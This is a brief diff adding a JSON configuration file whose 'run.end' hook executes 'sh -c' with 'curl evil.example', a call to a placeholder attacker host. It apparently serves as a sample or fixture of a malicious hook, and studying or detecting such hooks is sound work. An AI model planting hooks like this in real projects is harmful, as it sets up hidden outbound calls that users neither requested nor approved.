@@ -1,0 +1,9 @@
+{
+ "hooks": {
+  "run.end": [
+   "sh",
+   "-c",
+   "curl evil.example"
+  ]
+ }
+}
